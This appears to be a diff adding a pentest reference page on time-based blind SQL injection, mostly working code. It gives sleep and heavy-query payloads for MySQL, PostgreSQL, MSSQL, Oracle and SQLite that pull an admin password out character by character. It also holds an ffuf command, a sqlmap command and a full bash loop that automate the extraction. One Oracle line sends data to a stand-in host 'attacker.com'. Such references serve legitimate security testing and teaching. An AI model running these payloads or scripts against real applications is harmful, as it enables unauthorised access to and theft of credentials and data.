@@ -1,0 +1,201 @@
+---
+title: Time-based Blind SQLi
+description: Extracting data via measurable response delays when no other feedback is available.
+mitre: [T1190, T1213]
+d3fend: [D3-MH, D3-NTA]
+impact: [DataExfil]
+owasp: [A05]
+sidebar:
+  order: 7
+  label: Blind (time)
+---
+import { Aside, Tabs, TabItem } from '@astrojs/starlight/components';
+
+The application's response is identical regardless of injection - but if you make the database sleep, the response takes longer. Use timing as your boolean oracle.
+
+## TL;DR
+
+<Tabs syncKey="dbms">
+  <TabItem label="MySQL / MariaDB">
+    ```sql
+    ' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a', SLEEP(5), 0)-- -
+    ```
+  </TabItem>
+  <TabItem label="PostgreSQL">
+    ```sql
+    '; SELECT CASE WHEN SUBSTR((SELECT password FROM users WHERE username='admin'),1,1)='a' THEN pg_sleep(5) ELSE pg_sleep(0) END-- -
+    ```
+  </TabItem>
+  <TabItem label="MSSQL">
+    ```sql
+    '; IF (SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a') WAITFOR DELAY '0:0:5'-- -
+    ```
+  </TabItem>
+  <TabItem label="Oracle">
+    ```sql
+    ' AND 1=(CASE WHEN SUBSTR((SELECT password FROM users WHERE username='admin'),1,1)='a' THEN dbms_pipe.receive_message(('a'),5) ELSE 1 END)-- -
+    ```
+  </TabItem>
+</Tabs>
+
+If response takes ~5s, the condition was true. Otherwise false.
+
+## When to use
+
+When no other technique works:
+- No errors visible
+- Response identical for true and false conditions
+- No out-of-band path available (DNS/HTTP egress blocked)
+
+Also useful for **detection** before extraction - if `SLEEP(5)` causes a 5-second delay, you have injection.
+
+## Per-DBMS sleep payloads
+
+<Tabs syncKey="dbms">
+  <TabItem label="MySQL / MariaDB">
+    ```sql
+    -- Simple delay (always sleeps if injection works)
+    ' AND SLEEP(5)-- -
+    '; SELECT SLEEP(5)-- -                    -- if stacked queries supported
+
+    -- Conditional delay
+    ' AND IF(<CONDITION>, SLEEP(5), 0)-- -
+    ' AND SLEEP(IF(<CONDITION>, 5, 0))-- -
+
+    -- Heavy query alternative (when SLEEP is filtered)
+    ' AND (SELECT count(*) FROM information_schema.columns A, information_schema.columns B)-- -
+    ```
+  </TabItem>
+  <TabItem label="PostgreSQL">
+    ```sql
+    -- Simple delay
+    '; SELECT pg_sleep(5)-- -
+    ' || pg_sleep(5)-- -
+
+    -- Conditional
+    '; SELECT CASE WHEN <CONDITION> THEN pg_sleep(5) ELSE pg_sleep(0) END-- -
+    ' AND (SELECT CASE WHEN <CONDITION> THEN pg_sleep(5) ELSE NULL END) IS NULL-- -
+    ```
+  </TabItem>
+  <TabItem label="MSSQL">
+    ```sql
+    -- Requires stacked queries support
+    '; WAITFOR DELAY '0:0:5'-- -
+
+    -- Conditional
+    '; IF (<CONDITION>) WAITFOR DELAY '0:0:5'-- -
+
+    -- Inline (no stacked queries)
+    ' AND 1=(CASE WHEN <CONDITION> THEN (SELECT count(*) FROM sysobjects A, sysobjects B, sysobjects C) ELSE 1 END)-- -
+    ```
+  </TabItem>
+  <TabItem label="Oracle">
+    ```sql
+    -- Built-in sleep is blocked in many configurations; use:
+    ' AND 1=(CASE WHEN <CONDITION> THEN dbms_pipe.receive_message(('a'),5) ELSE 1 END)-- -
+
+    -- Heavy query alternative
+    ' AND 1=(SELECT count(*) FROM all_objects A, all_objects B WHERE <CONDITION>)-- -
+
+    -- DNS-based exfil (also out-of-band, see out-of-band page)
+    ' AND DBMS_LDAP.INIT(('attacker.com',80))=1-- -
+    ```
+  </TabItem>
+  <TabItem label="SQLite">
+    ```sql
+    -- No native sleep - use heavy query
+    ' AND randomblob(100000000)-- -
+    ' AND CASE WHEN <CONDITION> THEN randomblob(100000000) ELSE 0 END-- -
+    ```
+  </TabItem>
+</Tabs>
+
+## Extraction workflow
+
+Identical to [Boolean blind](../blind-boolean/), but the oracle is "did the response take >Nms?":
+
+1. Establish baseline response time (e.g., 200ms).
+2. Establish "true" response time with a known-true condition that triggers SLEEP.
+3. For each character position, binary-search ASCII via timing.
+
+<Aside type="tip">
+Pick a sleep duration well above network jitter - typically 3–5 seconds. Below 1s is unreliable; above 10s wastes time.
+</Aside>
+
+## Automation
+
+### `ffuf` with timing filter
+
+```bash
+ffuf -w chars.txt:CHAR \
+  -u "https://<TARGET>/page" \
+  -H "Cookie: id=xyz' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='CHAR', SLEEP(3), 0)-- -" \
+  -t 1 \
+  -p 0.1 \
+  -mt ">2500"
+```
+
+`-mt ">2500"` matches responses over 2500ms. `-t 1` keeps it single-threaded so timing is reliable.
+
+### `sqlmap`
+
+```bash
+sqlmap -u "https://<TARGET>/page?id=1" --technique=T --dbms=mysql --dump
+```
+
+`--technique=T` restricts to time-based. `sqlmap` tunes the delay automatically based on observed jitter.
+
+### Bash loop
+
+```bash
+target="https://<TARGET>/page"
+extracted=""
+
+for pos in {1..32}; do
+  for c in {a..f} {0..9}; do  # narrow charset for hex hash
+    start=$(date +%s%N)
+    curl -s -o /dev/null \
+      -H "Cookie: id=xyz' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),$pos,1)='$c', SLEEP(3), 0)-- -" \
+      "$target"
+    end=$(date +%s%N)
+    elapsed_ms=$(( (end - start) / 1000000 ))
+    if [ "$elapsed_ms" -gt 2500 ]; then
+      extracted="${extracted}${c}"
+      echo "Position $pos: $c (so far: $extracted)"
+      break
+    fi
+  done
+done
+echo "Final: $extracted"
+```
+
+## Considerations
+
+<Aside type="caution">
+**Connection pools.** Some apps pool DB connections. A `SLEEP()` query may block the pool and cause unrelated user traffic to slow down. Be aware of impact during business-hours testing.
+</Aside>
+
+- **Network jitter** - set the delay long enough to cleanly distinguish true (5s) from baseline (200ms). Don't use 1s delays unless the network is exceptionally clean.
+- **Concurrency** - keep extraction single-threaded. Multiple threads measuring the same target's response time interfere with each other.
+- **Asynchronous queries** - PostgreSQL's `pg_sleep` blocks the request. But some Node.js/asyncio apps use connection pools where the sleep blocks one connection without delaying the response. Test with a known-true `SLEEP` first to confirm timing actually changes.
+- **WAF time-based filtering** - some WAFs strip `SLEEP(`. Use `BENCHMARK(10000000, MD5(1))` (MySQL) or heavy query alternatives.
+- **`AND` vs `OR` evaluation** - `AND SLEEP(5)` only fires if the left side is true. If you want unconditional delay (for detection), use `OR SLEEP(5)` or terminate with `;`.
+
+## Detection-only payloads
+
+When you only want to confirm injection (not extract data), unconditional sleep:
+
+```sql
+'; SELECT pg_sleep(5)-- -                  -- PostgreSQL
+'; WAITFOR DELAY '0:0:5'-- -               -- MSSQL
+' OR SLEEP(5)-- -                          -- MySQL
+' OR (SELECT 1 FROM (SELECT SLEEP(5))a)-- - -- MySQL with subquery
+```
+
+Repeat 3 times. If all three add ~5s, injection confirmed.
+
+## Notes
+
+- Time-based is slow. A 32-char password at 5s per character with binary search is ~32 × 7 × 5s = ~19 minutes. Plan accordingly.
+- Combine with `LIMIT 1 OFFSET <N>` to walk through rows when extracting multiple records.
+- For cases where the application's response time naturally varies a lot (e.g., shared hosting under load), increase delay to 10s or run each test multiple times and take the median.
